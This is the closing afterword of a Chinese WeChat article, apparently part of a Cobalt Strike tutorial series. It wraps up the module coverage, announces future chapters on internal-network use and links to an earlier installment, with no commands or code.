**四、后语**

关于 cobalt strike 各模块的使用到这里就告一段落，有疑问的小伙伴欢迎留言和斗哥交流讨论，cs 系列的后续章节将带大家介绍 cs 在内网中的具体使用，敬请期待。

  

往期推荐

  

  

[全网最全的 Cobalt Strike 使用教程系列 - 基础篇](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247495346&idx=1&sn=0d938f8eecc23f50fc95ebf55a459fe5&chksm=9acd3e2dadbab73b845ef4662eeec38d75409a15c6e9a2f80cdb9df7ccc935204a1c2d6d9340&scene=21#wechat_redirect)

**推荐阅读**[**![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyIDG0WicDG27ztM2s7iaVSWKiaPdxYic8tYjCatQzf9FicdZiar5r7f7OgcbY4jFaTTQ3HibkFZIWEzrsGg/640?wx_fmt=png)**](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247494811&idx=1&sn=23ec661f57424184e43ea216a8398c58&chksm=9acd3c04adbab512e2a1c40156b05a5dc40ea07dacf239a9041235324a563d555a4e4625e988&scene=21#wechat_redirect)  

公众号

**觉得不错点个 **“赞”**、“在看”，支持下小编****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**